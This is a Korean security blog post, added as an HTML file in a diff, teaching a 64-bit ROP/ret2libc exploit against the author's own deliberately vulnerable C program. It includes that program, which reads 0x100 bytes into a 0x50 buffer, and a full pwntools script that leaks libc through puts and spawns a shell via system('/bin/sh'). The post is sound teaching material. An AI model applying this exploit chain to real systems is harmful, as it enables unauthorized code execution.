@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="ko" data-theme="light"><head>
+  <meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>[PWNABLE] ROP_64bit · whrds.log</title><meta name="description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전에서는 32비트에 다뤘다면 이번에는 64비트를 다루겠다. #include void gift(){ __asm__ (&quot;pop %r9&quot;); __asm__ (&quot;pop %r8&quot;); __asm__ (&quot;pop %rcx&quot;); __asm__ (&quot;pop %rdx&quot;">
+  <meta name="theme-color" content="#f7f7f3"><link rel="canonical" href="https://whrds.github.io/ko/posts/pwnable-rop-64bit/">
+  <link rel="alternate" hreflang="ko" href="https://whrds.github.io/ko/posts/pwnable-rop-64bit/"><link rel="alternate" hreflang="en" href="https://whrds.github.io/en/posts/pwnable-rop-64bit/">
+  <meta property="og:type" content="article"><meta property="og:title" content="[PWNABLE] ROP_64bit · whrds.log"><meta property="og:description" content="※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전에서는 32비트에 다뤘다면 이번에는 64비트를 다루겠다. #include void gift(){ __asm__ (&quot;pop %r9&quot;); __asm__ (&quot;pop %r8&quot;); __asm__ (&quot;pop %rcx&quot;); __asm__ (&quot;pop %rdx&quot;"><meta property="og:url" content="https://whrds.github.io/ko/posts/pwnable-rop-64bit/">
+  <link rel="icon" href="/assets/favicon.svg" type="image/svg+xml"><link rel="stylesheet" href="/assets/styles.css">
+  <script>try{const t=localStorage.getItem('theme');if(t)document.documentElement.dataset.theme=t;else if(matchMedia('(prefers-color-scheme:dark)').matches)document.documentElement.dataset.theme='dark'}catch(e){}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"[PWNABLE] ROP_64bit","description":"※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전에서는 32비트에 다뤘다면 이번에는 64비트를 다루겠다. #include void gift(){ __asm__ (\"pop %r9\"); __asm__ (\"pop %r8\"); __asm__ (\"pop %rcx\"); __asm__ (\"pop %rdx\"","datePublished":"2023-12-01","inLanguage":"ko","url":"https://whrds.github.io/ko/posts/pwnable-rop-64bit/","author":{"@type":"Person","name":"whrds"}}</script>
+</head><body>
+  <a class="skip-link" href="#main">본문으로 건너뛰기</a>
+  <header class="site-header"><div class="shell header-inner">
+    <a class="brand" href="/ko/" aria-label="whrds.log home"><span class="brand-mark">W_</span><span class="brand-text">whrds.log</span></a>
+    <nav class="main-nav" aria-label="주 메뉴">
+      <a href="/ko/" aria-current="page">글</a>
+      <a href="/ko/about/">소개</a>
+    </nav>
+    <div class="header-tools">
+      <div class="language-switch" aria-label="Language">
+        <a href="#" class="active" lang="ko" aria-current="true">KO</a>
+        <a href="/en/posts/pwnable-rop-64bit/" class="" lang="en">EN</a>
+      </div>
+      <button class="icon-button" type="button" data-theme-toggle aria-label="Use dark theme">◐</button>
+    </div>
+  </div></header>
+  <main id="main"><article class="article-wrap"><header class="article-header"><p class="eyebrow">Security research notes</p><h1>[PWNABLE] ROP_64bit</h1><p class="article-description">※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전에서는 32비트에 다뤘다면 이번에는 64비트를 다루겠다. #include void gift(){ __asm__ (&quot;pop %r9&quot;); __asm__ (&quot;pop %r8&quot;); __asm__ (&quot;pop %rcx&quot;); __asm__ (&quot;pop %rdx&quot;</p><div class="article-meta"><time datetime="2023-12-01">2023년 12월 1일</time><span>·</span><span>1 분 읽기</span></div></header><div class="prose"><p><strong>※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. <strong>※</strong></strong> </p>
+<p>이전에서는 32비트에 다뤘다면 이번에는 64비트를 다루겠다.</p>
+<pre><code>#include &lt;stdio.h&gt;
+
+void gift(){
+	 __asm__ (&quot;pop %r9&quot;);
+	__asm__ (&quot;pop %r8&quot;);
+	__asm__ (&quot;pop %rcx&quot;);
+	__asm__ (&quot;pop %rdx&quot;);
+	__asm__ (&quot;pop %rsi&quot;);
+	__asm__ (&quot;pop %rdi&quot;);
+	__asm__ (&quot;ret&quot;);
+	__asm__ (&quot;pop %rax&quot;);
+   	__asm__ (&quot;ret&quot;);
+  	__asm__ (&quot;pop %rbx&quot;);
+ 	__asm__ (&quot;ret&quot;);
+ 	__asm__ (&quot;mov %rbx, (%rax)&quot;);
+ 	__asm__ (&quot;ret&quot;);
+ 	__asm__ (&quot;mov %rax, (%rbx)&quot;);
+ 	__asm__ (&quot;ret&quot;);
+}
+
+int main(){
+	char input[0x50];
+	puts(&quot;Hello! Whrd &quot;);
+
+	read(0,input,0x100);
+	return 0 ;
+}
+</code></pre>
+<p>이전에 수행했던 예제에 가젯들만 추가로 주어주었다.</p>
+<p>64비트에서는 rdi, rsi, rdx, rcx, r8, r9 순으로 레지스터를 사용한다는 것을 잊지 말아야한다.</p>
+<p>이전과 달리 레지스터를 사용해야 하기 때문에 chain을 구성하는 것에 있어서</p>
+<p>실행하고자 하는 함수 실행 이전에 레지스터에 값들이 들어가 있어야 한다.</p>
+<p>때문에 가젯 -&gt; 인자 -&gt; 함수 순으로 들아가야 한다.</p>
+<p><img src="/assets/images/tistory/tistory-c12e6171f061/001.png" alt=""></p>
+<p>buf의 크기는 0x50이다.</p>
+<p>32비트와 공격 방법은 유사하기 때문에 생각하기 쉬울 것이다.</p>
+<p>0x50 + 0x8 + p_rdi + puts_got + puts_plt 순으로 입력하면 된다.</p>
+<p><img src="/assets/images/tistory/tistory-c12e6171f061/002.png" alt=""></p>
+<p>이런 방식으로 입력하면 main()이후에 바로 puts()에 의해서 puts()의 실제 주소가 출력이 된다.</p>
+<p>이후 다시 main()으로 복귀하면 이전과는 다르게 함수의 주소를 가지고 있기 때문에 libc_base를 구할 수 있다.</p>
+<p>이를 이용해서 shell을 취득하면 된다,</p>
+<p>위의 것만 주의해주면 나머지는 32비트와 동일한 벙븝올 수행이 가능하다.</p>
+<pre><code>from pwn import *
+
+p = process('./rop64')
+e = ELF('./rop64')
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+
+context.log_level = 'debug'
+
+###############################################
+p_rdi = 0x0000000000401165
+ret = 0x000000000040101a
+
+puts_plt = e.plt['puts']
+puts_got = e.got['puts']
+main = e.sym['main']
+
+########## Stage 1 : libc_base ################
+
+payload = b'A'*0x50
+payload += b'B'*0x8
+payload += p64(p_rdi)
+payload += p64(puts_got)
+payload += p64(puts_plt)
+payload += p64(main)
+
+p.sendafter(b'Whrd',payload)
+p.recvn(2)
+libc_base = u64(p.recvn(6).ljust(8,b'\x00')) - libc.sym['puts']
+print('libc_base = ', hex(libc_base))
+
+########## Stage 2 : attack ## ################
+
+system = libc_base + libc.sym['system']
+binsh = libc_base + next(libc.search(b'/bin/sh'))
+
+payload = b'A'*0x50
+payload += b'B'*0x8
+payload += p64(ret)
+payload += p64(p_rdi)
+payload += p64(binsh)
+payload += p64(system)
+
+p.sendafter(b'Whrd', payload)
+p.interactive()
+</code></pre>
+</div><div class="article-end"><a href="/ko/">← 모든 글 보기</a><a href="/en/posts/pwnable-rop-64bit/" hreflang="en">이 글을 영어로 읽기 →</a></div></article></main>
+  <footer class="site-footer"><div class="shell footer-inner"><span>© 2026 whrds</span><span>관찰하고, 검증하고, 기록합니다.</span><a href="/ko/feed.xml">RSS</a></div></footer>
+  <script src="/assets/app.js" defer></script>
+</body></html>
